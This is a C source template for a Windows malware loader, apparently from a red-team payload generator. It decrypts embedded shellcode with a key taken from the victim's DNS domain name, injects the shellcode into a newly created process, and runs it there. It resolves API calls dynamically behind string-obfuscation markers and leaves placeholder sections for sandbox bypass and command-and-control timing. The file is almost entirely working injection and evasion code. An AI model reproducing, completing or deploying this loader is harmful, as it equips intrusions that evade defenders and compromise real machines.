#include <windows.h>
#include <stdbool.h>

#include "Shellcode.h"
#include "EntropyDecrease.h"

#ifdef DEBUG
	#include <stdio.h>
#endif

HANDLE 	ProcessCreate	(char * processName);
HANDLE 	ProcessOpen	(DWORD processID);
LPVOID 	AllocMemory	(HANDLE process, SIZE_T size);
BOOL 	WriteMemory	(HANDLE process, LPVOID baseAddress, LPCVOID buffer, SIZE_T size);
BOOL 	ProtectMemory	(HANDLE process, LPVOID baseAddress, SIZE_T size, DWORD protection);
HANDLE 	ThreadOpen	(DWORD threadID);
BOOL 	ExecuteMemory	(HANDLE process, LPVOID baseAddress);
int 		AESDecrypt	(char * payload, unsigned int payload_len, char * key, size_t keylen);

bool PayloadControl();
bool Bypass();

bool PayloadControl(){
// Control_replace
	return true;
}

bool Bypass(){
// Bypass_replace
	return true;
}


// AESDecrypt_replace
// ProcessCreate_replace
// ProcessOpen_replace
// AllocMemory_replace
// WriteMemory_replace
// ProtectMemory_replace
// ExecuteMemory_replace

int go(char * proc_to_inj, unsigned char * shellcode, SIZE_T size) {
	#ifdef DEBUG
		printf("[*] proc_to_inj: %s\n", proc_to_inj);
	#endif
	char 	domain[MAX_PATH];
	DWORD 	domain_size = sizeof(domain);

	typedef BOOL (WINAPI * GetComputerNameExA_) (COMPUTER_NAME_FORMAT, LPSTR, LPDWORD);
	GetComputerNameExA_ _GetComputerNameExA = (GetComputerNameExA_)GetProcAddress(GetModuleHandleA(<obf>"kernel32.dll"<ob_end>), <obf>"GetComputerNameExA"<ob_end>);
	_GetComputerNameExA(ComputerNameDnsDomain, domain, &domain_size);
	//GetComputerNameExA(ComputerNameDnsDomain, domain, &domain_size);

	#ifdef DEBUG
		printf("[*] Domain name: %s\n", domain);
	#endif

	AESDecrypt((char *) shellcode, size, domain, strlen(domain));

	// Main Fork&Run flow
	HANDLE process = ProcessCreate(proc_to_inj);
	if (process == NULL) {
		return 1;
	}

	typedef BOOL (WINAPI * CloseHandle_) (HANDLE);
	CloseHandle_ _CloseHandle = (CloseHandle_)GetProcAddress(GetModuleHandleA(<obf>"kernel32.dll"<ob_end>), <obf>"CloseHandle"<ob_end>);
	typedef BOOL (WINAPI * VirtualFreeEx_) (HANDLE, LPVOID, SIZE_T, DWORD);
	VirtualFreeEx_ _VirtualFreeEx = (VirtualFreeEx_)GetProcAddress(GetModuleHandleA(<obf>"kernel32.dll"<ob_end>), <obf>"VirtualFreeEx"<ob_end>);


	LPVOID mem = AllocMemory(process, size);
	if (mem == NULL) {
		_CloseHandle(process);
		return 1;
	}
	if (!WriteMemory(process, mem, shellcode, size)) {
		_VirtualFreeEx(process, mem, 0, MEM_RELEASE);
		_CloseHandle(process);
		return 1;
	}

    RtlSecureZeroMemory(shellcode, size);

	if (!ProtectMemory(process, mem, size, PAGE_EXECUTE_READ)) {
		_VirtualFreeEx(process, mem, 0, MEM_RELEASE);
		_CloseHandle(process);
		return 1;
	}
	if (!ExecuteMemory(process, mem)) {
		_VirtualFreeEx(process, mem, 0, MEM_RELEASE);
		_CloseHandle(process);
		return 1;
	}
	_VirtualFreeEx(process, mem, 0, MEM_RELEASE);
	_CloseHandle(process);
	return 0;
}

int main() {
	typedef VOID (WINAPI * ExitProcess_) (UINT);
	ExitProcess_ _ExitProcess = (ExitProcess_)GetProcAddress(GetModuleHandleA(<obf>"kernel32.dll"<ob_end>), <obf>"ExitProcess"<ob_end>);

	if(!Bypass()) {
		// ExitProcess(0);
		_ExitProcess(0);
	}

	if(!PayloadControl()) {
		// ExitProcess(0);
		_ExitProcess(0);
	}


	#ifdef FASTC2
// fast_section_replace
	#endif
	#ifdef MEDIUMC2
// medium_section_replace
	#endif
	#ifdef SLOWC2
// slow_section_replace
	#endif
	return 0;
}
